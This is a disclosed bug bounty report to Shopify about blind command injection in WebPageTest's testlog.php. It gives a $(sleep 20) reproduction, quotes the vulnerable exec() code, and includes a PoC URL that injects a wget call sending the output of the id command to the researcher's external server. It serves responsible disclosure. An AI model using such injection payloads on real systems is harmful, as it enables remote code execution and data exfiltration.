Timeline
prakharprasad submitted a report to Shopify.
Jul 2nd (2 years ago)

Hi,

I just found a remote code execution bug at http://wpt.ec2.shopify.com/

Reproduction

  1. Open
  2. In the text area enter $(sleep 20) and hit "Update List"
  3. The result should come out at around 20 seconds, there-by executing sleep command

POC: http://wpt.ec2.shopify.com/testlog.php?days=1&filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29

I've attached a video for this RCE bug, in which I had executed id command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.

Regards,
Prakhar Prasad

francoischagnon posted a comment.
Jul 15th (2 years ago)

Hi @prakharprasad ,

I want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don't reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it's very trivial to exploit.

This vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at https://github.com/WPO-Foundation/webpagetest.

At the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.

This application was running in a separate Amazon account, so despite the severity of this issue, other Shopify servers were never put at risk.

prakharprasad posted a comment.
Jul 15th (2 years ago)

Hey @francoischagnon,

I want to add a few more details about this issue. First, I have to mention that the host (wpt.ec2.shopify.com) is not in scope of our bug bounty program. We normally don't reward out of scope issues, but we decided to make an exception due to the severity of the issue, and the fact that it's very trivial to exploit.

Thanks a lot for making this exception. I really appreciate this.

This vulnerability is located in a third party tool called WebPageTest. The source code of this application is open source and available at https://github.com/WPO-Foundation/webpagetest.

I am aware of this, in fact the vulnerability itself was discovered by doing a source code review of the file testlog.php. The sink is PHP's exec() function and taint is $filter which takes $_GET["filter"]; as input.

Vulnerable Code Snippet:

$filter    = $_GET["filter"];  # user supplied input
$filterstr = $filter ? strtolower($filter) : null;

. . .  . . . 

$filterstr = trim(escapeshellarg(str_replace(array('"', "'", '\\'), '', trim($filterstr))), "'\""); # basic filtering

. . .  . . . 

 $pattern = $filterstr;

. . .  . . . 

$command = "grep -i -F \"$pattern\" \"$fileName\"";
exec($command, $lines, $result_code); # exec() user supplied input.

At the time I write this, we have not notified the authors of this application yet, which we intend to do before we make this issue public.

That's alright. I will keep this vulnerability private till there is a patch around. Then we can coordinate on public disclosure.

Thanks !
